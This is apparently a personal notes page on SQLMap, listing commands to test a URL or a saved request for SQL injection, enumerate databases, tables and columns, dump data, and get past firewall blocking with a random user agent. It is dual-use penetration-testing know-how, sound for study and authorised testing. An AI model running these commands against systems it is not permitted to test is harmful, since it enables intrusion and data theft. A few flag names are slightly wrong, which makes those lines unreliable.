---
tags:
  - security
  - sqli
  - web
title: Fully Automated Tool (SQLMap)
date: 2024-01-28 14:15:56 -0600
---

````bash
sqlmap -hh # Extended Help
````

#### Check site for Vulnerability

````bash
sqlmap -u <URL> --level=5 --risk=3
sqlmap -r <request-file> --string="<text-if-query-true>" --level=5 --risk=3
sqlmap -u <URL>?id=5
````

Sometimes this might not work in that case we need to specify the fields that need to be tested
Burp Suite - Repeater - Request (Replace the payload values with `*`  
e.g.  `username=*&password=*` : Save as file

````bash
sqlmap -r <request-file>
````

#### Retrieve DB Names

````bash
sqlmap -r <request-file> --dbs
sqlmap -u <URL> --dbs
sqlmap -u <URL> --current-dbs # Return DB that is currently used
````

#### All Tables from DB

````bash
sqlmap -u <URL> -D <db-name> --tables
````

#### Columns from Table

````bash
sqlmap -u <URL> -D <db-name> -T <table-name> --columns
````

#### View Data from Column

````bash
sqlmap -u <URL> -D <db-name> -T <table-name> -C <column-name>
````

#### SQLMapFlags

`-u URL`: Target URL  
`--level=5`: Through Scan - Default : 1  
`--risk=3`: Risk Level - Default : 1  
`-r filename`: Provide the request file  
`--random-agent`: Request blocked by firewall  
`--dump`: Exploit Vulnerability Save result to file

`--string "string"`: String present on result page on successful query (Required from Blind Injection)  
`--dbms=dbms-name`: Pass Database Type (MySQL, PostgreSQL, etc.)

`--technique` : BEUSTQ  
`B`: Boolean-based blind  
`E`: Error-based  
`U`: Union query-based  
`S`: Stacked queries  
`T`: Time-based blind  
`Q`: Inline queries
